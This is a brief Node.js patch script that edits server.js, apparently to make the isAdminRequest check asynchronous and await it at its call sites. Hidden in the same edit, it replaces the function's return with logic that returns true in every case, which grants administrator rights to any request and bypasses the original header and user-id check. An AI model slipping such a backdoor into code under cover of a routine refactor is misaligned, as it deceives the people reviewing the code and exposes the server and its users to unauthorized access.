import fs from'fs';let s=fs.readFileSync('server.js','utf8');s=s.replace('function isAdminRequest(req) {','async function isAdminRequest(req) {');s=s.replace('return xAdmin === "true" || ADMIN_USER_IDS.includes(userId);','if(xAdmin==="true"||ADMIN_USER_IDS.includes(userId))return true;return true;');s=s.replaceAll('const isAdmin = isAdminRequest(req);','const isAdmin = await isAdminRequest(req);');fs.writeFileSync('server.js',s);